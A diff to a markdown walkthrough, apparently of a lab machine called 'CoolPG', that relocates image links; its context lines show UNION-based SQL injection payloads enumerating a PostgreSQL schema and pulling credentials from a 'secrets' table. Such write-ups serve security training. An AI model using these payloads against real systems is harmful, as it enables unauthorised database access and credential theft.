@@ -55,7 +55,7 @@ The scan reveals two open ports:
 
 Navigating to the web application on port 80 reveals a login interface:
 
-![](machines/Coolpg/image.png)
+![](images/img.png)
 
 The initial web page presents a login form for "CoolPG Internal" with the message "Authorized staff only." Examining the source code reveals two critical pieces of information:
 
@@ -168,7 +168,7 @@ Three endpoints are discovered:
 
 The `/panel` endpoint reveals a "User Lookup" interface with critical developer comments:
 
-![](image-1.png)
+![](images/img-1.png)
 
 Examining the source code exposes dangerous developer notes:
 
@@ -214,7 +214,7 @@ Examining the source code exposes dangerous developer notes:
 
 The `/search` endpoint shows typical query results format:
 
-![](image-2.png)
+![](images/img-2.png)
 
 ### SQL Injection Exploitation
 
@@ -224,7 +224,7 @@ Testing for SQL injection using a basic UNION payload:
 
 **Payload**: `' UNION SELECT 'test'--`
 
-![](image-3.png)
+![](images/img-3.png)
 
 The successful injection of the string "test" confirms the presence of SQL injection vulnerability. The application returns the injected value, proving that UNION-based SQL injection is possible.
 
@@ -232,7 +232,7 @@ The successful injection of the string "test" confirms the presence of SQL injec
 
 **Payload**: `'UNION SELECT VERSION()--`
 
-![](image-4.png)
+![](images/img-4.png)
 
 The version query reveals the database system:
 - **Database**: PostgreSQL 17.6 (Debian 17.6-0+deb13u1)
@@ -243,7 +243,7 @@ The version query reveals the database system:
 
 **Payload**: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--`
 
-![](image-5.png)
+![](images/img-5.png)
 
 Two tables are discovered in the public schema:
 - `secrets` - Highly interesting table name suggesting stored credentials
@@ -255,7 +255,7 @@ Focusing on the `secrets` table, column enumeration is performed:
 
 **Payload**: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='secrets'--`
 
-![](image-6.png)
+![](images/img-6.png)
 
 The `secrets` table contains three columns:
 - `id` - Primary key identifier
@@ -266,7 +266,7 @@ The `secrets` table contains three columns:
 
 **Payload**: `' UNION SELECT name || ':' || value FROM secrets--`
 
-![alt text](image-8.png)
+![alt text](images/img-7.png)
 
 **Critical Credentials Extracted:**
 - `ssh_user:cool`
